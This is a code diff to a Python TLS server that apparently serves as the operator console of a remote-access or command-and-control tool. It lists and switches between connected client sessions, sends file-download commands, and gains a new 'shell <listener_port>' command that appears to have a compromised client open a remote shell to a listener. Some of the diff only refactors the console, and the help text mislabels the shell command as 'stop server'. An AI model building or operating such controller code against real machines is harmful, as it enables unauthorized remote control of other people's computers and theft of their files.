@@ -78,7 +78,9 @@ class TLSServer:
                 self.current_session = sid
 
         logger.debug("[+] New session %d from %s", sid, addr)
+        self._listen_on_session(sid, tls_sock)
 
+    def _listen_on_session(self, sid, tls_sock):
         try:
             while self.running:
                 data = readline(tls_sock) # tls_sock.recv(4096)
@@ -90,6 +92,7 @@ class TLSServer:
             logger.debug("[-] Session %d connection error", sid)
         finally:
             self._remove_session(sid)
+
 
     def _remove_session(self, sid):
         with self.lock:
@@ -118,34 +121,13 @@ class TLSServer:
             cmd = input(prompt).strip()
 
             if cmd == "help":
-                logger.debug("Commands:")
-                logger.debug("  help           -> send help message to client")
-                logger.debug("  sessions       -> list sessions")
-                logger.debug("  use <id>       -> switch session")
-                logger.debug("  exit           -> stop server")
-
-            elif cmd == "quit":
-                self.stop()
+                self._help()
 
             elif cmd == "sessions":
-                with self.lock:
-                    if not self.sessions:
-                        logger.debug("No active sessions")
-                    for sid in self.sessions:
-                        mark = "*" if sid == self.current_session else " "
-                        logger.debug("%s %d %s", mark, sid, self.addresses[sid])
+                self._sessions()
 
             elif cmd.startswith("use "):
-                try:
-                    sid = int(cmd.split()[1])
-                    with self.lock:
-                        if sid in self.sessions:
-                            self.current_session = sid
-                            logger.debug("Switched to session %d", sid)
-                        else:
-                            logger.debug("Invalid session id")
-                except ValueError:
-                    logger.debug("Usage: use <id>")
+                self._use(cmd)
 
             elif cmd == "help":
                 self._send_to_current(b"HELP: available commands coming soon\n")
@@ -157,12 +139,43 @@ class TLSServer:
             elif cmd.startswith("download "):
                 self._send_to_current(cmd.encode("utf-8"))
 
+            elif cmd.startswith("shell "):
+                self._send_to_current(cmd.encode("utf-8"))
+
             elif cmd == "exit":
                 logger.debug("Exiting admin console")
                 return
 
             else:
                 pass
+
+    def _help(self):
+        logger.debug("Commands:")
+        logger.debug("  help                     -> send help message to client")
+        logger.debug("  sessions                 -> list sessions")
+        logger.debug("  use <id>                 -> switch session")
+        logger.debug("  shell <listener_port>    -> stop server")
+        logger.debug("  exit                     -> stop server")
+
+    def _use(self, cmd: str):
+        try:
+            sid = int(cmd.split()[1])
+            with self.lock:
+                if sid in self.sessions:
+                    self.current_session = sid
+                    logger.debug("Switched to session %d", sid)
+                else:
+                    logger.debug("Invalid session id")
+        except ValueError:
+            logger.debug("Usage: use <id>")
+
+    def _sessions(self):
+        with self.lock:
+            if not self.sessions:
+                logger.debug("No active sessions")
+            for sid in self.sessions:
+                mark = "*" if sid == self.current_session else " "
+                logger.debug("%s %d %s", mark, sid, self.addresses[sid])
 
     def _recv_file(self, filename):
         with self.lock:
